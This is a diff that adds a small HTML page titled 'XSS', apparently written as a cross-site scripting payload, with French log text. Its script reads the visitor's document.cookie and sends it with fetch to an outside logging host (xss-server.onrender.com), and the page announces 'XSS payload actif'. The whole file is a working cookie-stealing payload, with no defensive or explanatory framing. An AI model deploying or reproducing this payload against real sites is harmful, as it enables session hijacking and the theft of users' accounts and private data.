@@ -1,0 +1,12 @@
+<!-- xss.html -->
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>XSS</title></head>
+<body>
+<script>
+  fetch("https://xss-server.onrender.com/log?cookie=" + document.cookie)
+    .then(() => console.log("Cookie envoyé"));
+</script>
+<h1>XSS payload actif</h1>
+</body>
+</html>
